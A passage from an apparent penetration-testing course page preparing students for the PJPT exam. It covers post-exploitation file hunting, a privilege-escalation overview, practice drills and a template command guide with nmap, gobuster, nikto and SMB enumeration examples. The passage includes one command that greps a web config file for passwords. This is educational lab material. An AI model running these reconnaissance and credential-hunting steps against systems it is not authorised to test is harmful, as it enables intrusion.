<code>/var/www/html/</code> or similar locations. Look for configuration files, database connection strings, uploaded files.</li>\n<li><strong>Configuration Directories:</strong> <code>/etc/</code>. Look for service configuration files (e.g., database configs, web server configs).</li>\n<li><strong>Log Directories:</strong> <code>/var/log/</code>. Sometimes credentials or interesting information end up in logs.</li>\n</ul>\n</li>\n<li><p><strong>Basic Commands for Navigation and Listing:</strong></p>\n<ul>\n<li><code>pwd</code>: Print working directory (Where am I now?).</li>\n<li><code>ls -la</code>: List files and directories with detailed information (permissions, ownership, size). <code>-a</code> shows hidden files (starting with <code>.</code>).</li>\n<li><code>cd &lt;directory&gt;</code>: Change directory.</li>\n<li><code>cat &lt;file&gt;</code>: Display file contents.</li>\n<li><code>grep &lt;pattern&gt; &lt;file&gt;</code>: Search for patterns within files (e.g., <code>cat /var/www/html/config.php | grep -i &quot;password&quot;</code>).</li>\n</ul>\n</li>\n<li><p><strong>PJPT Tip:</strong> Focus on common locations related to the service you compromised. If it was a web server, check web roots and associated config files. If it was a database, look for database configuration files.</p>\n</li>\n<li><p><strong>Action for Your Guide:</strong> Create a subsection under &quot;Post-Exploitation&quot; called &quot;Manual File Hunting&quot; or similar. List common directories to check (<code>/home/</code>, <code>/var/www/</code>, <code>/etc/</code>, <code>/var/log/</code>). Document the basic commands (<code>pwd</code>, <code>ls -la</code>, <code>cd</code>, <code>cat</code>, <code>grep</code>) and their purpose in this context. Note <em>what kind</em> of files you&#39;d be looking for (configs, credentials, logs).</p>\n</li>\n</ul>\n<hr>\n<h3><strong>Section 7.4: Privilege Escalation (Brief Overview)</strong></h3>\n<p>You&#39;ve gathered basic info. You know who you are (<code>id</code>), where you are (<code>hostname</code>, <code>ip a</code>), and what&#39;s running (<code>netstat</code>). Often, the next step in a real penetration test is <strong>Privilege Escalation (PrivEsc)</strong> – moving from a low-privileged user to a higher-privileged user, typically <code>root</code> on Linux or Administrator on Windows.</p>\n<ul>\n<li><p><strong>What is PrivEsc?</strong> Exploiting weaknesses (misconfigurations, kernel bugs, weak permissions, credentials) to gain higher access on the <em>same</em> system.</p>\n</li>\n<li><p><strong>Why is it important?</strong> Root/Administrator access gives you full control – access to all files, ability to install software, modify configurations, dump credentials, etc.</p>\n</li>\n<li><p><strong>PJPT Context:</strong> While PrivEsc is a huge topic in pentesting, the PJPT often focuses on demonstrating initial access and basic post-exploitation. Complex PrivEsc might not be a core requirement, or the path might be relatively straightforward if included. <em>However</em>, knowing your initial user&#39;s privileges (<code>id</code>, <code>sudo -l</code>) is part of basic information gathering and can point towards simple PrivEsc vectors if they exist (e.g., being in the <code>sudo</code> group with passwordless sudo permissions).</p>\n</li>\n<li><p><strong>Action for Your Guide:</strong> Add a brief note about Privilege Escalation in your &quot;Post-Exploitation&quot; section. Define it simply (&quot;The process of gaining higher privileges on a system after initial access&quot;). State that it&#39;s often the next step, but the focus for this guide and likely PJPT is on the <em>initial info gathering</em> phase covered in Section 7.2. Mention that checking group memberships (<code>id</code>) and sudo privileges (<code>sudo -l</code>, if available) are relevant checks related to PrivEsc potential.</p>\n</li>\n</ul>\n<hr>\n<h3><strong>Section 7.5: The CRUCIAL Reinforcement Phase: Building Muscle Memory</strong></h3>\n<p>Okay, listen up! This is arguably the most important part of this module, and maybe the whole course, for your PJPT preparation. Building your guide is fantastic – it&#39;s your reference. But you can&#39;t rely on reading your guide word-for-word during a timed exam. You need <strong>muscle memory</strong>.</p>\n<p>You need to be able to <em>think</em> &quot;Okay, I have an IP range, what&#39;s step 1?&quot; and immediately type <code>nmap -sS -p- &lt;target_ip_range&gt;</code> (or your preferred initial scan). You need to think &quot;HTTP is open, what&#39;s next?&quot; and immediately type <code>gobuster dir -u http://&lt;target_ip&gt; -w &lt;wordlist_path&gt;</code>.</p>\n<p>This module is your dedicated time to hammer those commands into your brain and fingers.</p>\n<ul>\n<li><strong>Why Muscle Memory?</strong><ul>\n<li><strong>Speed:</strong> You&#39;ll work much faster during the exam.</li>\n<li><strong>Accuracy:</strong> Repetition reduces typos and syntax errors.</li>\n<li><strong>Confidence:</strong> Knowing the commands flow automatically reduces stress.</li>\n<li><strong>Problem Solving:</strong> Frees up your brain to focus on <em>analyzing</em> output and <em>strategizing</em>, rather than trying to remember command flags.</li>\n</ul>\n</li>\n<li><strong>The Reinforcement Exercise:</strong><ol>\n<li><strong>Choose a NEW Target:</strong> Pick a different practice machine/IP range from your lab environment or a platform like HTB Starting Point or THM.</li>\n<li><strong>Start from SCRATCH:</strong> Begin with Reconnaissance (Module 2).</li>\n<li><strong>Try WITHOUT Your Guide FIRST:</strong> For each phase (Recon, Scanning, Enumeration), try to perform the steps and type the commands <em>from memory</em>.</li>\n<li><strong>Use Your Guide as a CHECK and FILLER:</strong> <em>After</em> you attempt a command or a phase, open your PJPT Command Guide.<ul>\n<li>Did you remember the command correctly? Great! Move on.</li>\n<li>Did you forget a flag? Did you use the wrong syntax? Did you forget a useful command for that phase? <strong>Look it up in your guide!</strong> Practice typing the correct command <em>now</em>. Understand <em>why</em> you forgot it.</li>\n<li>Are there commands in your guide you <em>didn&#39;t</em> think to use? Why? Add them to your mental checklist for next time.</li>\n</ul>\n</li>\n<li><strong>Document New Learnings:</strong> If you discover a better way to phrase a command in your guide, or a crucial flag you missed, update your guide <em>immediately</em>.</li>\n<li><strong>Repeat:</strong> Go through the entire flow (Recon -&gt; Scan -&gt; Enum -&gt; Vulnerability Analysis -&gt; Exploitation -&gt; Basic Post-Exploitation) on this new target.</li>\n<li><strong>Do it AGAIN:</strong> Reset the target or pick another one. Repeat the entire process. The more you do it, the more automatic it becomes.</li>\n</ol>\n</li>\n</ul>\n<p>This exercise is <em>not</em> about getting root on the target. It&#39;s about practicing the <em>process</em> and solidifying the <em>commands</em> for the core workflow phases (Recon, Scan, Enum primarily, as they are the most command-heavy and repetitive parts).</p>\n<ul>\n<li><strong>Action for Your Guide:</strong> While you&#39;re not adding <em>new</em> commands here (unless you refined something), the <em>act</em> of using the guide during this practice is its purpose. You should add a note in your guide&#39;s introduction or conclusion about the importance of this reinforcement exercise and how to use the guide effectively during practice – as a reference and verification tool, not a step-by-step script to follow blindly every time.</li>\n</ul>\n<hr>\n<h3><strong>Section 7.6: Documenting in Your Guide (Post-Exploitation)</strong></h3>\n<p>As you performed the basic post-exploitation steps in Section 7.2 and 7.3, you should have been documenting them in your guide. Let&#39;s ensure that section is solid.</p>\n<ul>\n<li><p><strong>Structure Your &quot;Post-Exploitation&quot; Section:</strong></p>\n<ul>\n<li>Start with an introduction explaining the purpose of this phase.</li>\n<li>Create subsections for different types of information gathered (e.g., &quot;System Information&quot;, &quot;Network Configuration&quot;, &quot;Running Services&quot;, &quot;Manual File Hunting&quot;).</li>\n<li>For each command:<ul>\n<li>State the command clearly (<code>whoami</code>).</li>\n<li>Briefly explain its purpose (&quot;Shows current user&quot;).</li>\n<li>Provide the common syntax (<code>whoami</code>).</li>\n<li>Include an example of the expected output (using code blocks <code>```</code>).</li>\n<li>Add notes on <em>what</em> specifically to look for in the output (e.g., &quot;Look for UID 0 for root&quot;).</li>\n</ul>\n</li>\n<li>Include notes on where to look for sensitive files (Section 7.3).</li>\n<li>Include the brief note on Privilege Escalation (Section 7.4).</li>\n</ul>\n</li>\n<li><p><strong>Example Guide Snippet (Post-Exploitation Section):</strong></p>\n<pre><code class=\"language-markdown\">### Post-Exploitation: Initial System Survey\n\nOnce initial access is gained, the immediate goals are to understand the compromised system&#39;s environment and identify potential next steps. This section documents essential commands for gathering basic system information.\n\n#### System Information\n\n*   **Identify Current User:**\n    *   **Command:** `whoami`\n    *   **Purpose:** Displays the effective username of the current user. Essential to know your starting privilege level.\n    *   **Syntax:** `whoami`\n    *   **Example Output:**\n        ```bash\n        www-data\n        ```\n    *   **Notes:** Look for `root` (highest privilege) vs. service accounts (e.g., `www-data`, `mysql`) or standard users.\n\n*   **Get User &amp; Group IDs:**\n    *   **Command:** `id`\n    *   **Purpose:** Provides detailed user information including UID, GID, and all supplementary groups. Group memberships can indicate potential permissions or vectors (e.g., &#39;sudo&#39;).\n    *   **Syntax:** `id`\n    *   **Example Output:**\n        ```bash\n        uid=33(www-data) gid=33(www-data) groups=33(www-data)\n        ```\n    *   **Notes:** Pay close attention to the `groups=` list. Membership in groups like `sudo` is highly significant.\n\n*   **Identify Hostname:**\n    *   **Command:** `hostname`\n    *   **Purpose:** Displays the system&#39;s network name. Necessary for reporting and identifying the specific target machine.\n    *   **Syntax:** `hostname`\n    *   **Example Output:**\n        ```bash\n        target-web-srv\n        ```\n\n... (Continue with `ip a`, `netstat -tulnp`, OS/Kernel identification commands in similar format) ...\n\n#### Manual File Hunting\n\nAfter gaining access, manually checking common locations can reveal sensitive information or configuration details.\n\n*   **Common Directories to Check:**\n    *   `/home/&lt;username&gt;/` or `~`: User configuration files (`.bashrc`, `.ssh/`), user data.\n    *   `/var/www/`: Web server files, application configurations (e.g., database credentials in config files).\n    *   `/etc/`: System-wide configuration files.\n\n*   **Useful Commands for File Hunting:**\n    *   `pwd`: Print current directory.\n    *   `ls -la`: List files and directories (including hidden ones) with detailed permissions.\n    *   `cd &lt;directory&gt;`: Change directory.\n    *   `cat &lt;file&gt;`: Display file contents.\n    *   `grep &lt;pattern&gt; &lt;file&gt;`: Search for text within a file.\n        *   *Example:* `cat /var/www/html/config.php | grep -i &quot;pass&quot;`\n\n#### Privilege Escalation (Brief Note)\n\nPrivilege Escalation is the process of gaining higher access on the compromised system. While a full topic in itself, for basic post-exploitation and PJPT scope, focus on understanding your current user&#39;s capabilities (`id`, potentially `sudo -l` if available) and gathering the initial system info. This info sometimes points to simple escalation paths.\n</code></pre>\n</li>\n<li><p><strong>Action for Your Guide:</strong> Review and refine the &quot;Post-Exploitation&quot; section of your guide based on the commands and structure discussed. Ensure clarity and accuracy.</p>\n</li>\n</ul>\n<hr>\n<h3><strong>Module Project/Exercise: Post-Exploitation &amp; Muscle Memory</strong></h3>\n<p>This module&#39;s project has two equally important parts: basic documentation of post-exploitation commands and dedicated practice for muscle memory.</p>\n<ol>\n<li><p><strong>Part 1: Basic Post-Exploitation Documentation</strong></p>\n<ul>\n<li>Connect to a practice target where you have gained initial access (from Module 6 or a new one).</li>\n<li>Execute the following basic post-exploitation commands: <code>whoami</code>, <code>id</code>, <code>hostname</code>, <code>ip a</code> (or <code>ifconfig</code>), <code>netstat -tulnp</code>.</li>\n<li>Explore some common locations for sensitive files using <code>pwd</code>, <code>ls -la</code>, <code>cd</code>, <code>cat</code> (e.g., check a web root if applicable, check <code>/etc/</code>).</li>\n<li>Document these commands and your findings in the &quot;Post-Exploitation&quot; section of your PJPT Command Guide. For each command, include the syntax, purpose, and example output. Note the common file locations and the commands used to explore them.</li>\n</ul>\n</li>\n<li><p><strong>Part 2: Workflow Reinforcement Drill</strong></p>\n<ul>\n<li>Choose a <em>different</em> practice target, or reset the target from Part 1 to its initial state.</li>\n<li>Set a timer if you like, but the goal is focus and speed, not a strict time limit initially.</li>\n<li>Start the entire PJPT workflow from the beginning:<ul>\n<li><strong>Reconnaissance:</strong> Identify the target IP(s). Use <code>ping</code>, <code>host</code>/<code>dig</code>, <code>whois</code> (</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-8": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 8: module_8</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, welcome to the final module! You&#39;ve made it this far, building piece by piece, command by command, a truly valuable resource. You&#39;ve navigated recon, scanning, enumeration, exploitation, and even dipped your toes into post-exploitation.</p>\n<p>Now, we arrive at the crucial stage that separates a successful pentester (and PJPT candidate) from someone who just knows commands: <strong>Documentation and Communication</strong>. This module is all about taking the arsenal you&#39;ve built – your collection of documented commands and workflows – and forging it into a polished, functional tool: <strong>Your Personal PJPT Command &amp; Workflow Guide</strong>.</p>\n<p>This isn&#39;t just about writing things down; it&#39;s about organizing your knowledge, reinforcing your learning, and creating a resource that will be your trusted companion during the PJPT exam and beyond. Think of it as compiling your battle plan and field manual into one comprehensive binder.</p>\n<p>Let&#39;s dive deep and finalize your masterpiece.</p>\n<hr>\n<h2>Module 8: Communicating Findings: Reporting &amp; Finalizing Your Guide (Capstone)</h2>\n<ul>\n<li><strong>Module Objective:</strong> By the end of this module, you will understand the critical role of documentation in offensive security, especially for certifications like the PJPT. You will consolidate, organize, and refine all the documentation you&#39;ve created throughout the course into a single, comprehensive &quot;PJPT Practical Command &amp; Workflow Guide,&quot; ready to be used as a powerful tool for exam preparation and execution.</li>\n</ul>\n<hr>\n<h3>8.1 The Indispensable Role of Documentation</h3>\n<p>You might be thinking, &quot;I&#39;ve done the cool hacking stuff, why do I need to write about it?&quot; Great question! In the real world of penetration testing, documentation is not optional; it&#39;s fundamental.</p>\n<ul>\n<li><strong>Why Document?</strong><ul>\n<li><strong>Replicability:</strong> Can someone else (or future you) follow your steps to achieve the same result? This is vital for verification and quality control.</li>\n<li><strong>Proof:</strong> You need to <em>prove</em> you found a vulnerability and successfully exploited it. Screenshots and detailed command logs are your evidence.</li>\n<li><strong>Reporting:</strong> The ultimate deliverable for a client (or the PJPT examiner) is the report. Your documentation is the raw material for this report.</li>\n<li><strong>Knowledge Transfer:</strong> Sharing findings with teammates or explaining them to stakeholders requires clear, documented steps.</li>\n<li><strong>Learning &amp; Improvement:</strong> Reviewing your own documented process helps you identify areas for efficiency or alternative approaches.</li>\n<li><strong>PJPT Requirement:</strong> Explicitly or implicitly, the PJPT assesses your ability to conduct a <em>structured</em> test and document your findings. Your guide <em>is</em> your structured approach documented.</li>\n</ul>\n</li>\n</ul>\n<p>Think of your guide not just as notes, but as the blueprint of your testing methodology. It captures <em>your</em> process, refined through practice.</p>\n<h3>8.2 Key Elements of PJPT Documentation</h3>\n<p>For the PJPT and similar practical exams, your documentation serves two primary purposes:</p>\n<ol>\n<li><strong>To guide <em>you</em> during the exam:</strong> Quick lookups, command syntax reminders, workflow checklist.</li>\n<li><strong>To provide evidence <em>after</em> the exam (if required):</strong> Some certifications require submitting logs or screenshots. Your guide should make it easy to pull this info.</li>\n</ol>\n<p>Based on the practical nature, here are the essential elements <em>per step</em> in your guide:</p>\n<ul>\n<li><strong>The Goal/Phase:</strong> What are you trying to achieve? (e.g., &quot;Identify open ports,&quot; &quot;Enumerate SMB shares,&quot; &quot;Gain initial access&quot;).</li>\n<li><strong>The Tool/Technique:</strong> What are you using? (e.g., Nmap, gobuster, smbclient, Metasploit).</li>\n<li><strong>The Command Used:</strong> The exact command you executed. Include <code>sudo</code> if necessary.<ul>\n<li><em>Example:</em> <code>sudo nmap -sV -p- 192.168.1.105 -oA scans/full_scan_105</code></li>\n</ul>\n</li>\n<li><strong>Explanation of Flags/Syntax:</strong> Briefly explain <em>what</em> the key options do. This reinforces your understanding.<ul>\n<li><em>Example:</em> <code>-sV</code> (Service Version Detection), <code>-p-</code> (Scan all ports 1-65535), <code>-oA</code> (Output in all formats - Normal, XML, Grepable).</li>\n</ul>\n</li>\n<li><strong>Why This Command/Technique Here?</strong> What was the strategic reason for using this command at this point in your workflow?<ul>\n<li><em>Example:</em> &quot;Used <code>-p-</code> after the initial quick scan to ensure no less common open ports were missed.&quot;</li>\n</ul>\n</li>\n<li><strong>Expected/Actual Output Snippet:</strong> Include a representative snippet of the command&#39;s output. This is <em>crucial</em> evidence and helps you quickly scan your guide for relevant results.<ul>\n<li><em>Example (from Nmap scan):</em><pre><code>PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\n22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)\n80/tcp open  http    Apache httpd 2.2.22 ((Debian))\n</code></pre>\n</li>\n</ul>\n</li>\n<li><strong>Findings/Analysis:</strong> What did you learn from the output? This translates raw data into actionable intelligence.<ul>\n<li><em>Example:</em> &quot;Target has FTP (vsftpd 2.3.4), SSH (OpenSSH 6.0), and HTTP (Apache 2.2.22) open. vsftpd 2.3.4 is known to be vulnerable.&quot;</li>\n</ul>\n</li>\n<li><strong>Evidence (Screenshot Reference/Link):</strong> Note where you saved the screenshot showing this output or finding. While you won&#39;t submit a full report <em>during</em> the PJPT, having this habit is good, and you might need to show specific evidence <em>if asked</em> or for your own post-exam review.<ul>\n<li><em>Example:</em> &quot;Screenshot: <code>screenshots/192.168.1.105_nmap_full_scan.png</code>&quot;</li>\n</ul>\n</li>\n<li><strong>Next Steps (Optional but Recommended):</strong> Based on the findings, what&#39;s your logical next action?<ul>\n<li><em>Example:</em> &quot;Next: Investigate vsftpd 2.3.4 vulnerability using searchsploit.&quot;</li>\n</ul>\n</li>\n</ul>\n<p>Structuring your guide with these elements for each significant command/step ensures you have a complete picture of <em>how</em> you progressed and <em>why</em>.</p>\n<h3>8.3 Structuring Your Findings: Building the Guide</h3>\n<p>Let&#39;s get practical about organizing all the pieces you&#39;ve built since Module 1. The most logical structure mirrors the standard penetration testing phases. Your guide should flow like your exam process will flow.</p>\n<p>Here&#39;s a suggested structure using Markdown headings:</p>\n<pre><code class=\"language-markdown\"># My Awesome PJPT Practical Command &amp; Workflow Guide\n\n*   [Link to Table of Contents](#table-of-contents)\n*   [Link to Introduction](#introduction)\n\n## Table of Contents\n\n*   [Introduction](#introduction)\n*   [1. Setting Up (Environment &amp; Tools)](#1-setting-up-environment--tools)\n*   [2. Reconnaissance](#2-reconnaissance)\n    *   [Passive Recon](#passive-recon)\n    *   [Active Recon (Ping, Traceroute)](#active-recon-ping-traceroute)\n    *   [DNS Enumeration](#dns-enumeration)\n    *   ... (Add more specific sub-sections as needed)\n*   [3. Scanning](#3-scanning)\n    *   [Nmap Basics](#nmap-basics)\n    *   [Common Scan Types (-sS, -sT, -sU)](#common-scan-types--ss--st--su)\n    *   [Port Specification (-p, -p-)](#port-specification--p--p-)\n    *   [Version &amp; OS Detection (-sV, -O)](#version--os-detection--sv--o)\n    *   [Output Formats (-oA)](#output-formats--oa)\n    *   ...\n*   [4. Enumeration](#4-enumeration)\n    *   [General Enumeration Techniques](#general-enumeration-techniques)\n    *   [HTTP/HTTPS Enumeration (gobuster, nikto, manual)](#httphttps-enumeration-gobuster-nikto-manual)\n    *   [SMB/Samba Enumeration (smbclient, enum4linux, Nmap NSE)](#smbsamba-enumeration-smbclient-enum4linux-nmap-nse)\n    *   [SSH Enumeration](#ssh-enumeration)\n    *   [FTP Enumeration](#ftp-enumeration)\n    *   [Other Service Enumeration (SMTP, SNMP, etc.)](#other-service-enumeration-smtp-snmp-etc)\n    *   [Netcat/Telnet for Banner Grabbing](#netcattelnet-for-banner-grabbing)\n    *   [Nmap NSE for Enumeration](#nmap-nse-for-enumeration)\n    *   ...\n*   [5. Vulnerability Analysis](#5-vulnerability-analysis)\n    *   [Correlating Findings with CVEs](#correlating-findings-with-cves)\n    *   [Using searchsploit](#using-searchsploit)\n    *   [Online Databases (Exploit-DB, NVD)](#online-databases-exploit-db-nvd)\n    *   [Identifying Common Misconfigurations](#identifying-common-misconfigurations)\n    *   ...\n*   [6. Exploitation](#6-exploitation)\n    *   [Introduction to Exploitation](#introduction-to-exploitation)\n    *   [Metasploit Framework Basics](#metasploit-framework-basics)\n    *   [Using Specific Metasploit Modules](#using-specific-metasploit-modules)\n    *   [Manual Exploitation (Scripts, Tools)](#manual-exploitation-scripts-tools)\n    *   [Setting Up Listeners (Netcat, Metasploit handler)](#setting-up-listeners-netcat-metasploit-handler)\n    *   [Shell Stabilization](#shell-stabilization)\n    *   ...\n*   [7. Post-Exploitation](#7-post-exploitation)\n    *   [Basic System Information Gathering](#basic-system-information-gathering)\n    *   [Identifying Sensitive Files (Basic)](#identifying-sensitive-files-basic)\n    *   [Understanding User Privileges (Brief)](#understanding-user-privileges-brief)\n    *   ...\n*   [8. Tips &amp; Tricks for the PJPT Exam](#8-tips--tricks-for-the-pjpt-exam)\n*   [Conclusion](#conclusion)\n\n---\n\n*   [Back to Top](#my-awesome-pjpt-practical-command--workflow-guide)\n\n## Introduction\n\nWelcome to my personal guide for the PJPT exam. This document serves as a comprehensive collection of commands, techniques, and workflow steps, organized by penetration testing phase. Its purpose is to provide a quick reference during the exam, reinforce muscle memory, and ensure a structured approach to target analysis and exploitation. All commands documented here have been practiced and verified in a lab environment. Use this guide as a dynamic tool – update it as you learn!\n\n---\n\n## 1. Setting Up (Environment &amp; Tools)\n\n*   **Goal:** Ensure my testing environment is ready.\n*   **Key Setup Steps:**\n    *   Verify Attacker VM (Kali/Parrot) is running.\n    *   Check network connectivity to target range.\n    *   Open my documentation tool (this guide!).\n    *   Ensure necessary tools (Nmap, Metasploit, gobuster, etc.) are installed and updated (if applicable).\n\n### Documentation Tool Setup\n\n*   **Tool Used:** [Specify your tool, e.g., Obsidian, Markdown in VS Code, OneNote]\n*   **Why Use:** [Briefly explain why you chose it - e.g., &quot;Markdown is portable and easy to format,&quot; &quot;OneNote is great for screenshots.&quot;]\n*   **Template Structure:** [Describe or show the basic structure you&#39;ve created - linking to the TOC above covers this.]\n*   **Screenshot Tool:** [Mention how you capture screenshots, e.g., `scrot -s`, Kali&#39;s default tool.]\n    *   **Command (scrot example):** `scrot -s -d 5 ~/screenshots/$(date +%Y%m%d_%H%M%S)_screenshot.png`\n    *   **Syntax/Options:** `-s` (select area), `-d 5` (5-second delay), `~/screenshots/...` (save location and filename format).\n    *   **Purpose:** Capture evidence of findings or successful steps.\n\n---\n\n## 2. Reconnaissance\n\n*   **Goal:** Gather information about the target scope without direct interaction (passive) and with minimal, detectable interaction (active).\n\n### Passive Recon\n\n*   **Purpose:** Identify initial target IPs, domains, potential contacts, etc., using publicly available information.\n*   **Techniques:** Google Dorking, WHOIS lookups, DNS lookups via online tools.\n\n#### WHOIS Lookup\n\n*   **Tool:** `whois`\n*   **Purpose:** Retrieve domain registration information.\n*   **Command:** `whois example.com`\n*   **Syntax/Options:** Just the domain name.\n*   **Why Use:** Find contact info, name servers, registration dates, sometimes IP ranges.\n*   **Example Output Snippet:** (Show a snippet focusing on Nameservers or organization)\n    ```\n    Domain Name: EXAMPLE.COM\n    Registry Domain ID: 243303-\n    Registrar WHOIS Server: whois.markmonitor.com\n    Registrar URL: http://www.markmonitor.com\n    ...\n    Name Server: NS1.EXAMPLE.COM\n    Name Server: NS2.EXAMPLE.COM\n    ```\n*   **Findings:** Identified name servers and registrar for example.com.\n*   **Next Steps:** Use `dig` or `host` on the identified name servers.\n\n### Active Recon (Ping, Traceroute)\n\n*   **Purpose:** Basic network connectivity checks and path tracing.\n\n#### Ping\n\n*   **Tool:** `ping`\n*   **Purpose:** Check if a host is live and measure latency.\n*   **Command:** `ping -c 4 192.168.1.105`\n*   **Syntax/Options:** `-c 4` (send 4 packets).\n*   **Why Use:** Simple check to see if a target IP is responding to ICMP.\n*   **Example Output Snippet:**\n    ```\n    PING 192.168.1.105 (192.168.1.105) 56(84) bytes of data.\n    64 bytes from 192.168.1.105: icmp_req=1 ttl=64 time=0.045 ms\n    64 bytes from 192.168.1.105: icmp_req=2 ttl=64 time=0.067 ms\n    ...\n    ```\n*   **Findings:** Host 192.168.1.105 is live and responding to ping.\n\n### DNS Enumeration\n\n*   **Purpose:** Discover hostnames, mail servers, etc., associated with a domain.\n\n#### Host\n\n*   **Tool:** `host`\n*   **Purpose:** Perform DNS lookups (A, MX, NS records).\n*   **Command:** `host example.com`\n*   **Syntax/Options:** Just the domain name. Can add record type (e.g., `host -t MX example.com`).\n*   **Why Use:** Quickly find IP address (A record), mail servers (MX records), name servers (NS records) for a domain.\n*   **Example Output Snippet:**\n    ```\n    example.com has address 93.184.216.34\n    example.com mail is handled by 0 .\n    ```\n*   **Findings:** Found the A record for example.com.\n\n---\n\n## 3. Scanning\n\n*   **Goal:** Identify live hosts and open ports within the target scope.\n\n### Nmap Basics\n\n*   **Tool:** `nmap`\n*   **Purpose:** The primary network scanning tool.\n*   **Basic Command Structure:** `nmap [Scan Type] [Options] [Target Specification]`\n\n#### Basic SYN Scan\n\n*   **Purpose:** Quickly identify open TCP ports. Stealthy.\n*   **Command:** `sudo nmap -sS &lt;target_ip&gt;`\n*   **Syntax/Options:** `sudo` (required for raw packets), `-sS` (SYN scan).\n*   **Why Use:** Standard first step for TCP port scanning. Fast and less likely to be logged than a full connect scan.\n*   **Example Output Snippet:** (See example in the thinking process above)\n*   **Findings:** List the open ports found.\n\n#### Full Port Scan with Service/Version Detection\n\n*   **Purpose:** Scan all 65535 TCP ports and identify service versions.\n*   **Command:** `sudo nmap -sV -p- &lt;target_ip&gt; -oA scans/fullscan_&lt;target_ip&gt;`\n*   **Syntax/Options:** `-sV` (Service Version), `-p-` (All ports), `-oA scans/...` (Output to all formats in `scans` directory).\n*   **Why Use:** Comprehensive scan to find all potential entry points and gather crucial version information for enumeration/vulnerability analysis.\n*   **Example Output Snippet:** (Show output with SERVICE VERSION column)\n*   **Findings:** List all open ports, their services, and versions. Note any particularly interesting or potentially vulnerable services/versions.\n*   **Screenshot:** `screenshots/target_nmap_sV_p-_output.png` (Reference your saved evidence)\n\n*(... Continue with other Nmap commands like UDP scan `-sU`, OS detection `-O`, specific port scans `-p 22,80,443`, etc., using the same detailed format.)*\n\n---\n\n## 4. Enumeration\n\n*   **Goal:** Dive deep into specific services running on open ports to gather detailed information (versions, configurations, users, shares, directories, etc.). This is where you understand *what* is running.\n\n### HTTP/HTTPS Enumeration\n\n*   **Purpose:** Explore web servers for directories, files, technologies, and potential vulnerabilities.\n\n#### Gobuster (Directory/File Brute-forcing)\n\n*   **Tool:** `gobuster` (or `dirb`)\n*   **Purpose:** Discover hidden directories and files on a web server.\n*   **Command:** `gobuster dir -u http://&lt;target_ip&gt;:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o enum/http_dirbust_&lt;target_ip&gt;.txt`\n*   **Syntax/Options:** `dir` (directory mode), `-u` (URL), `-w` (wordlist), `-t 50` (50 threads), `-o enum/...` (output file).\n*   **Why Use:** Often reveals administrative interfaces, sensitive files, or unlinked pages that indicate underlying applications.\n*   **Example Output Snippet:**\n    ```\n    /admin              (Status: 301)\n    /backup             (Status: 200)\n    /robots.txt         (Status: 200)\n    /index.html         (Status: 200)\n    ```\n*   **Findings:** Found `/admin` redirect, `/backup` directory, and `robots.txt`. Investigate these further.\n*   **Screenshot:** `screenshots/target_gobuster_output.png`\n\n#### Nikto (Web Server Scanner)\n\n*   **Tool:** `nikto`\n*   **Purpose:** Scan web servers for known vulnerabilities, misconfigurations, and sensitive files.\n*   **Command:** `nikto -h http://&lt;target_ip&gt;:80 -o enum/http_nikto_&lt;target_ip&gt;.txt`\n*   **Syntax/Options:** `-h` (host), `-o enum/...` (output file).\n*   **Why Use:** Automated check for common web server weaknesses that might be missed manually.\n*   **Example Output Snippet:**\n    ```\n    + Server: Apache/2.2.22 (Debian)\n    + The anti-clickjacking X-Frame-Options header is not present.\n    + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST.\n    + OSVDB-3268: /icons/README: File contains server configuration information.\n    ```\n*   **Findings:** Identified Apache version, missing security headers, TRACE method enabled, and access to `/icons/README`.\n*   **Screenshot:** `screenshots/target_nikto_output.png`\n\n*(... Continue with manual web checks, `curl` commands, and other web enumeration techniques.)*\n\n### SMB/Samba Enumeration\n\n*   **Purpose:** Discover shared folders, users, and system information on SMB/Samba services.\n\n#### Enum4linux\n\n*   **Tool:** `enum4linux`\n*   **Purpose:** Comprehensive SMB/Samba enumeration tool.\n*   **Command:** `enum4linux -a &lt;target_ip&gt; &gt; enum/smb_enum4linux_&lt;target_ip&gt;.txt`\n*   **Syntax/Options:** `-a` (all simple enumeration options), `&gt; enum/...` (redirect output to file).\n*   **Why Use:** Gathers user lists, group lists, share names, OS information, password policy details, etc., often without authentication.\n*   **Example Output Snippet:**\n    ```\n    Users:\n    rid:[0x3e8] sid:[S-1-5-21-...] user:[raj]\n    rid:[0x3e9] sid:[S-1-5-21-...] user:[ravi]\n    ...\n    Share enumeration:\n    \\\\192.168.1.105\\IPC$ (IPC Service (raj server (Samba, Ubuntu)))\n    \\\\192.168.1.105\\share (Comment:)\n    ```\n*   **Findings:** Discovered users `raj`, `ravi`, and a shared folder `share`.\n*   **Screenshot:** `screenshots/target_enum4linux_output.png`\n\n#### Nmap NSE for SMB\n\n*   **Tool:** `nmap` with NSE scripts\n*   **Purpose:** Run specific scripts to enumerate SMB details.\n*   **Command:** `nmap --script smb-enum-users,smb-enum-shares -p 445 &lt;target_ip&gt; -oN enum/smb_nmap_nse_&lt;target_ip&gt;.txt`\n*   **Syntax/Options:** `--script` (specify script(s)), `-p 445` (target the SMB port), `-oN enum/...` (output to normal format).\n*   **Why Use:** Alternative or supplementary method to `enum4linux`, sometimes finds different details or works when `enum4linux` doesn&#39;t.\n*   **Example Output Snippet:**\n    ```\n    | smb-enum-users:\n    |   Users:\n    |     raj (RID: 1000)\n    |     ravi (RID: 1001)\n    | smb-enum-shares:\n    |   account_used: guest\n    |   \\share\n    |     Type: Disk\n    |     Comment:\n    |     Permissions: READ, WRITE\n    ```\n*   **Findings:** Confirmed users `raj`, `ravi`, and the `share` folder with READ/WRITE permissions via guest access.\n*   **Screenshot:** `screenshots/target_nmap_smb_nse_output.png`\n\n*(... Continue with `smbclient` for anonymous login attempts and exploring shares.)*\n\n### Other Service Enumeration\n\n*(... Add sections for SSH version identification, FTP anonymous login attempts, SMTP user enumeration (`vrfy`), SNMP enumeration (`snmpwalk`), etc. Use the same detailed format for each tool/technique: Command, Syntax, Why, Output, Findings, Screenshot.)*\n\n---\n\n## 5. Vulnerability Analysis\n\n*   **Goal:** Analyze the information gathered during Recon and Enumeration to identify specific vulnerabilities (CVEs) and potential attack paths.\n\n### Correlating Findings with 